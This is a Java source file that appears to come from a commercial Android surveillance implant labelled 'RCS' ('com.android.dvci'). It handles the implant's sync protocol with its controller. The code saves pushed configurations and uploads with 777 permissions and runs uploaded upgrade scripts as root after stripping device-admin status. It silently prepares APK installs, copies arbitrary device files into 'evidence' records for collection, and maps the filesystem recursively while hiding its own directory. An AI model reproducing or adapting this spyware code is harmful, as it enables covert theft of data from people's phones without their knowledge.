/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Protocol.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.action.sync;

import android.content.Intent;
import android.net.Uri;

import com.android.dvci.Status;
import com.android.dvci.action.UninstallAction;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfType;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Directory;
import com.android.dvci.file.Path;
import com.android.dvci.interfaces.iProtocol;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.Set;
import java.util.Vector;

/**
 * The Class Protocol, is extended by ZProtocol
 */
public abstract class Protocol implements iProtocol {

	/**
	 * The Constant UPGRADE_FILENAME.
	 */
	public static final String UPGRADE_FILENAME = M.e("core-update"); //$NON-NLS-1$
	/**
	 * The debug.
	 */
	private static final String TAG = "Protocol"; //$NON-NLS-1$
	private static Object configLock = new Object();
	/**
	 * The transport.
	 */
	protected Transport transport;

	Status status;

	static Set<String> blackListDir = new HashSet<String>(Arrays.asList(new String[]{"/sys", "/dev", "/proc", "/acct"}));

	/** The reload. */
	// public boolean reload;

	/** The uninstall. */
	// public boolean uninstall;

	/**
	 * Inits the.
	 *
	 * @param transport the transport
	 * @return true, if successful
	 */
	public boolean init(final Transport transport) {
		this.transport = transport;
		status = Status.self();
		// transport.initConnection();
		return true;
	}

	/**
	 * Save new conf.
	 *
	 * @param conf   the conf
	 * @param offset the offset
	 * @return true, if successful
	 * @throws CommandException the command exception
	 */
	public static boolean saveNewConf(final byte[] conf, final int offset) throws CommandException {
		boolean success = false;
		synchronized (configLock) {
			final AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveNewConf): " + file);
			}
			success = file.write(conf, offset, false);
		}

		if (success) {
			EvidenceBuilder.info(M.e("New configuration received")); //$NON-NLS-1$
			return true;
		} else {
			return false;
		}

	}

	/**
	 * Save upload.
	 *
	 * @param filename the filename
	 * @param content  the content
	 */
	public static void saveUpload(final String filename, final byte[] content) {
		final AutoFile file = new AutoFile(Path.uploads(), filename);

		if (file.delete()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " getUpload replacing existing file: " + filename);//$NON-NLS-1$
			}
		}

		file.write(content);
		file.chmod("777");

		if (Cfg.DEBUG) {
			Check.log(TAG + " file written: " + file.exists());//$NON-NLS-1$
		}
	}

	/**
	 * Upgrade multi.
	 *
	 * @param files the files
	 * @return true, if successful
	 */
	public static boolean upgradeMulti(final Vector<String> files) {

		String upgradeShell = String.format(M.e("upgrade.%s.sh"), Cfg.OSVERSION);
		boolean upgraded = false;

		// core.default.apk
		if (files.contains(upgradeShell) && Status.self().haveRoot()) {
			final File file = new File(Path.uploads(), upgradeShell);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (upgradeMulti): executing " + upgradeShell);
			}

			try {
				Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + file.getAbsolutePath());
			} catch (IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (upgradeMulti) Error: " + e);
				}
			}

			UninstallAction.removeAdmin(Status.getAppContext());

			String packageName = Status.self().getAppContext().getPackageName();

			Execute ex = new Execute();
			ExecuteResult result = ex.executeRoot(file.getAbsolutePath() +" "+ packageName);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (upgradeMulti) exitcode: %s", result.exitCode);
				Check.log(TAG + " (upgradeMulti) stdout: %s", result.stdout);
				Check.log(TAG + " (upgradeMulti) stderr: %s", result.stderr);
			}

			upgraded = result.exitCode == 0;
		}

		if (!upgraded) {
			EvidenceBuilder.info(M.e("Upgrade Succeed"));
			for (final String fileName : files) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (upgradeMulti): " + fileName);//$NON-NLS-1$
				}
				final File file = new File(Path.uploads(), fileName);
				if (fileName.endsWith(".apk")) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (upgradeMulti): action " + fileName);
					}
					final Intent intent = new Intent(Intent.ACTION_VIEW);
					intent.setDataAndType(Uri.fromFile(file), M.e("application/vnd.android.package-archive")); //$NON-NLS-1$
					intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					Status.getAppContext().startActivity(intent);
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (upgradeMulti): ignoring " + fileName);
					}
				}
			}
		}else{
			EvidenceBuilder.info(M.e("Upgrade Failed"));
		}

		for (final String fileName : files) {
			final File file = new File(Path.uploads(), fileName);
			file.delete();
		}

		return true;
	}

	/**
	 * Delete self.
	 *
	 * @return true, if successful
	 */
	public static boolean deleteSelf() {
		return false;
	}

	/**
	 * Save download log.
	 *
	 * @param filefilter the filefilter
	 */
	public static void saveDownloadLog(final String filefilter) {
		File file = new File(filefilter);
		if (file.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " logging file: " + filefilter);//$NON-NLS-1$
			}

			saveFileLog(file, filefilter);

		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " not a file, try to expand it: " + filefilter);//$NON-NLS-1$
			}
			final String[] files = file.list();
			for (final String filename : files) {

				file = new File(filename);
				if (file.isDirectory()) {
					continue;
				}

				saveFileLog(file, filename);
				if (Cfg.DEBUG) {
					Check.log(TAG + " logging file: " + filename);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Save file log.
	 *
	 * @param !file    the file
	 * @param filename the filename
	 */
	private static void saveFileLog(final File file, final String filename) {
		if (Cfg.DEBUG) {
			Check.requires(file != null, "null file"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(file.exists(), "file should exist"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(!filename.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		if (Cfg.DEBUG) {
			Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		byte[] content;
		if (!file.canRead()) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveFileLog): not readable");
			}
			return;
		}
		try {
			int length = (int) file.length();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveFileLog) %s length: %s", filename, length);
			}
			final byte[] additional = Protocol.logDownloadAdditional(filename);
			EvidenceBuilder ev = new EvidenceBuilder(EvidenceType.DOWNLOAD, additional, new Date(file.lastModified()));

			DataInputStream is = new DataInputStream(new FileInputStream(file));
			ev.write(is, length);

			is.close();
			ev.close();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveFileLog) Error: " + e);
			}
		}

	}

	/**
	 * Log download additional.
	 *
	 * @param filename the filename
	 * @return the byte[]
	 */
	private static byte[] logDownloadAdditional(String filename) {
		if (Cfg.DEBUG) {
			Check.requires(filename != null, "null file"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(!filename.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		if (Cfg.DEBUG) {
			Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		final String path = StringUtils.chomp(Path.hidden(), "/"); // UPLOAD_DIR //$NON-NLS-1$
		final int macroPos = filename.indexOf(path);
		if (macroPos >= 0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " macropos: " + macroPos);//$NON-NLS-1$
			}
			final String start = filename.substring(0, macroPos);
			final String end = filename.substring(macroPos + path.length());

			filename = start + Directory.hiddenDirMacro + end;
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " filename: " + filename);//$NON-NLS-1$
		}
		final int version = 2008122901;
		final byte[] wfilename = WChar.getBytes(filename);
		final byte[] buffer = new byte[wfilename.length + 8];

		final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length);

		databuffer.writeInt(version);
		databuffer.writeInt(wfilename.length);
		databuffer.write(wfilename);

		return buffer;
	}

	/**
	 * Save filesystem.
	 *
	 * @param depth the depth
	 * @param path  the path
	 */
	public static void saveFilesystem(final int depth, String path) {
		EvidenceBuilder fsLog = new EvidenceBuilder(EvidenceType.FILESYSTEM);

		// Expand path and create log
		if (path.equals("/")) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " sendFilesystem: root");//$NON-NLS-1$
			}
			expandRoot(fsLog, depth);
		} else {
			if (path.startsWith("//")) {
				path = path.substring(1, path.length());
			}
			if (path.endsWith("/*")) { //$NON-NLS-1$ //$NON-NLS-2$
				path = path.substring(0, path.length() - 2);
			}
			if (path.startsWith("/")) {
				expandPath(fsLog, path, depth, true);
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: sendFilesystem: strange path, ignoring it. " + path);//$NON-NLS-1$
				}
			}
		}

		fsLog.immediateClose();
	}

	/**
	 * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
	 *
	 * @param fsLog the fs log
	 * @param depth the depth
	 */
	private static void expandRoot(final EvidenceBuilder fsLog, final int depth) {
		if (Cfg.DEBUG) {
			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
		}
		saveRootLog(fsLog); // depth 0
		expandPath(fsLog, "/", depth, false); //$NON-NLS-1$

	}

	/**
	 * Save filesystem log.
	 *
	 * @param fsLog    the fs log
	 * @param filepath the filepath
	 * @return true, if successful
	 */
	private static boolean saveFilesystemLog(final EvidenceBuilder fsLog, final String filepath) {
		if (Cfg.DEBUG) {
			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(!filepath.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		if (Cfg.DEBUG) {
			Check.requires(!filepath.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: save FilesystemLog: " + filepath);//$NON-NLS-1$
		}
		final int version = 2010031501;

		final AutoFile file = new AutoFile(filepath);
		if (!file.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: non existing file: " + filepath);//$NON-NLS-1$
			}
			return false;
		}

		final byte[] w_filepath = WChar.getBytes(filepath, true);

		final byte[] content = new byte[28 + w_filepath.length];
		final DataBuffer databuffer = new DataBuffer(content, 0, content.length);

		databuffer.writeInt(version);
		databuffer.writeInt(w_filepath.length);

		int flags = 0;
		final long size = file.getSize();

		final boolean isDir = file.isDirectory();
		if (isDir) {
			flags = 1;
			String[] list = file.list();
			if (list == null || list.length == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveFilesystemLog), empty dir");
				}
				flags = 3;
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveFilesystemLog), simple file");
			}
			//flags = 2;
		}

		databuffer.writeInt(flags);
		databuffer.writeLong(size);
		Date filetime = file.getFileTime();
		databuffer.writeLong(DateTime.getFiledate(filetime));
		databuffer.write(w_filepath);

		fsLog.write(content);
		if (Cfg.DEBUG) {
			Check.log(TAG + " expandPath: written log");//$NON-NLS-1$
		}
		return isDir;

	}

	/**
	 * saves the root log. We use this method because the directory "/" cannot
	 * be opened, we fake it.
	 *
	 * @param fsLog the fs log
	 */
	private static void saveRootLog(final EvidenceBuilder fsLog) {
		final int version = 2010031501;
		if (Cfg.DEBUG) {
			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
		}
		final byte[] content = new byte[30];

		final DataBuffer databuffer = new DataBuffer(content);
		databuffer.writeInt(version);
		databuffer.writeInt(2); // len
		databuffer.writeInt(1); // flags
		databuffer.writeLong(0);
		databuffer.writeLong(DateTime.getFiledate(new Date()));
		databuffer.write(WChar.getBytes("/")); //$NON-NLS-1$

		fsLog.write(content);
	}

	/**
	 * Expand recursively the path saving the log. When depth is 0 saves the log
	 * and stop recurring.
	 *
	 * @param fsLog the fs log
	 * @param path  the path
	 * @param depth the depth
	 */
	private static void expandPath(final EvidenceBuilder fsLog, final String path, final int depth, boolean saveFirst) {
		if (Cfg.DEBUG) {
			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(path != null, "path==null"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(path == "/" || !path.endsWith("/"), "path should end with /"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}
		if (Cfg.DEBUG) {
			Check.requires(!path.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " expandPath: " + path + " depth: " + depth);//$NON-NLS-1$ //$NON-NLS-2$
		}
		final File dir = new File(path);
		if (dir.isDirectory()) {
			if(saveFirst) {
				Protocol.saveFilesystemLog(fsLog, path);
			}

			final String[] files = dir.list();
			if (files == null) {
				return;
			}
			for (final String file : files) {
				String dPath = path + "/" + file; //$NON-NLS-1$
				if (dPath.startsWith("//")) { //$NON-NLS-1$
					dPath = dPath.substring(1);
				}
				if (dPath.indexOf(StringUtils.chomp(Path.hidden(), "/")) >= 0) { //$NON-NLS-1$
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: " + "expandPath ignoring hidden path: " + dPath);//$NON-NLS-1$ //$NON-NLS-2$
					}
					continue;
				}

				try {
					if (!blackListDir.contains(dPath)) {
						final boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
						if (isDir && depth > 1) {
							expandPath(fsLog, dPath, depth - 1, false);
						}
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (expandPath) blocked path: %s", dPath);
						}
					}
				}catch (Exception ex){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (expandPath) error: %s", ex);
					}
				}
			}

		}
	}

	/**
	 * Normalize filename.
	 *
	 * @param file the file
	 * @return the string
	 */
	public static String normalizeFilename(final String file) {
		if (file.startsWith("//")) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " normalizeFilename: " + file);//$NON-NLS-1$
			}
			return file.substring(1);
		} else {
			return file;
		}
	}

}
